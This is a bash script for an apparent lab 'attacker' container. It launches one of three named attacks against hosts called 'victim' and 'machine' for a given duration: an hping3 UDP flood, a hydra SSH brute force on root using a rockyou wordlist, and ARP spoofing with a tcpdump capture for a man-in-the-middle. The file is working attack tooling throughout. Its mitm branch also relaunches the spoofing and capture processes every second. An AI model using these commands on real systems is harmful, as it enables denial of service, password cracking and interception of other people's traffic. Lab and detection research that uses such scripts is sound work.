#!/bin/bash

# Check if the script is running inside a Docker container
if [ ! -f /.dockerenv ] && ! grep -q docker /proc/1/cgroup; then
    echo "Error: This script is intended to run inside the attacker machine."
    exit 1
fi

# Check if the script has the correct number of args
if [ $# -lt 2 ]; then
    echo "Error: This script expects at least 2 arguments: <attack_name> <duration>"
    exit 1
fi

attack_name="$1"
duration="$2"
start_time=$(date +%s)

perform_arp_spoofing() {
    echo "Starting ARP spoofing attack between victim and machine..."
    arpspoof -i eth0 -t victim machine &
    arpspoof -i eth0 -t machine victim &
}

capture_packets() {
    echo "Capturing packets between victim and machine..."
    tcpdump -i eth0 host victim and host machine -w mitm_capture.pcap &
}

cleanup() {
    echo "Stopping ARP spoofing and cleaning up..."
    pkill arpspoof
    pkill tcpdump
    echo "Attack stopped."
}

trap cleanup SIGINT

while true; do
    current_time=$(date +%s)
    elapsed_time=$((current_time - start_time))

    if [ "$elapsed_time" -ge "$duration" ]; then
        echo "Attack duration completed."
        cleanup
        break
    fi

    if [ "$attack_name" == "ddos_udp" ]; then
        echo "Launching DDoS UDP attack..."
        timeout "$2" hping3 --udp -p 12345 --flood victim

    elif [ "$attack_name" == "ssh" ]; then
        echo "Performing SSH brute force attack..."
        hydra -l root -P /root/rockyou-50.txt ssh://victim

    elif [ "$attack_name" == "mitm" ]; then
        echo "Performing Man-in-the-Middle attack..."
        perform_arp_spoofing
        capture_packets

    else
        echo "Error: Attack_name '$attack_name' not implemented."
        cleanup
        exit 1
    fi

    sleep 1
done

echo "Attack finished"
